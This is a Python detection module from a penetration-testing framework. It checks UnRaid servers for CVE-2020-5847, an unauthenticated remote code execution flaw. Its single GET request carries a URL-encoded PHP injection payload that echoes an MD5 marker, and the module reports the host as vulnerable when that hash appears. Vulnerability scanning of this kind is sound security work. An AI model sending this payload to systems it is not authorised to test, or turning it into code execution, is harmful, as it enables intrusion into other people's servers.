#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""UnRaid <=6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'UnRaid <=6.80 - Remote Code Execution Detection',
        'description': 'UnRaid <=6.80 allows remote unauthenticated attackers to execute arbitrary code.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'rce', 'kev', 'unraid', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://sysdream.com/news/lab/2020-02-06-cve-2020-5847-cve-2020-5849-unraid-6-8-0-unauthenticated-remote-code-execution-as-root/',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5847',
            'https://sysdream.com/news/lab/',
            'https://forums.unraid.net/forum/7-announcements/',
            'https://github.com/Ostorlab/KEV',
        ],
        'cve': 'CVE-2020-5847',
    }

    def run(self):
        r = self.http_request(method="GET", path='/webGui/images/green-on.png/?path=x&site[x][text]=%3C?php%20echo%20md5(%22CVE-2020-5847%22);%20?%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('b13928fbcfff659363d7c7d1ec008d56',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='critical',
                reason="UnRaid <=6.80 - Remote Code Execution detected",
                path='/webGui/images/green-on.png/?path=x&site[x][text]=%3C?php%20echo%20md5(%22CVE-2020-5847%22);%20?%3E',
            )
            return True
        return False

